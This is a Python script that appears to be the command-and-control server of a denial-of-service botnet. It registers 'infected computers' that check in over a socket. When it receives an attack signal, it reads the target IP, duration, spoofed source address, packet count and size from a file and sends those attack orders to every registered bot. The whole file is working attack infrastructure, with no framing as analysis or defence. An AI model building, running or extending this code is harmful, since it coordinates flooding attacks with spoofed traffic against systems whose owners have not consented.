import socket

#setting up port number and host ip. Initializing empty list
HOST = "192.168.0.153"
PORT = 8012
infected_computers_online = {}


#initialising server
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen()
print(HOST, PORT)


def attack(infected_computers_online):
    #loading attack variables
    with open("./attack_variables.txt", encoding = "ascii") as attack_variables:
        target_ip, attack_duration, spoofed_source, packets_per_batch, packet_size = attack_variables.read().split(" ")

    #sending attack signals
    for server_ip, server_port in infected_computers_online.items():
        try:
            server = (server_ip, int(server_port)) # converting infected computer's info to a tuple

            # connecting to server
            host_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            host_socket.connect(server)

            # sending attack message
            host_socket.send(f"{target_ip} {attack_duration} {spoofed_source} {packets_per_batch} {packet_size}".encode("ascii"))
        except Exception:
            pass
    return True


#listening on requests from c&c computer
while True:
    # opening server to listen on requests
    communication_socket, address = server.accept()

    # getting and decoding message from c&c server
    message = communication_socket.recv(1024).decode("ascii").split(" ")

    # closing connection
    communication_socket.close()

    #initializing attack when attack signal arrives
    if message[0] == "attack":
        attack(infected_computers_online)
        continue
    else:
        #adding computer to the dictionary of infected computers
        infected_computers_online[message[0]] = message[1]
        print(f'registered computers are: {infected_computers_online}')